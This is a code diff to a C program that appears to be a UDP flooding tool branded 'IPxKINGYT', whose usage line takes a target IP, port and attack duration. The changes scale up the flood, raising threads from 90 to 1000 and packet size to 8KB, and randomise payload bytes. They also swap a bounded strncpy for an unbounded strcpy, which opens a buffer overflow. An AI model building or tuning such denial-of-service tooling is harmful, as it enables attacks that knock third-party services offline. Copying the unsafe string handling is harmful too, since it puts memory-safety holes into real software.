@@ -6,8 +6,8 @@
 #include <arpa/inet.h>
 #include <time.h>
 
-#define MAX_THREADS 90
-#define PAYLOAD_SIZE 1024  // IPxKINGYT©2024
+#define MAX_THREADS 1000  // Increase the number of threads
+#define PAYLOAD_SIZE 8192  // Increase payload size (8KB)
 
 typedef struct {
     char ip[16];
@@ -21,8 +21,10 @@ void* send_payload(void* arg) {
     struct sockaddr_in server_addr;
     char payload[PAYLOAD_SIZE];
 
-    memset(payload, 'A', PAYLOAD_SIZE - 1);
-    payload[PAYLOAD_SIZE - 1] = '\0';
+    // Randomize the payload data
+    for (int i = 0; i < PAYLOAD_SIZE; i++) {
+        payload[i] = rand() % 256;  // Generate random byte data
+    }
 
     sock = socket(AF_INET, SOCK_DGRAM, 0); 
     if (sock < 0) {
@@ -40,6 +42,7 @@ void* send_payload(void* arg) {
             perror("Send failed");
             break;
         }
+        usleep(500);  // Adjust delay between packets
     }
 
     close(sock);
@@ -48,13 +51,12 @@ void* send_payload(void* arg) {
 
 int main(int argc, char* argv[]) {
     if (argc != 4) {
-        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
+        printf("Usage: ./IPxKINGYT <IP> <PORT> <DURATION>\n");
         return 1;
     }
 
     AttackParams params;
-    strncpy(params.ip, argv[1], sizeof(params.ip) - 1);
-    params.ip[sizeof(params.ip) - 1] = '\0';
+    strcpy(params.ip, argv[1]);
     params.port = atoi(argv[2]);
     params.duration = atoi(argv[3]);
 
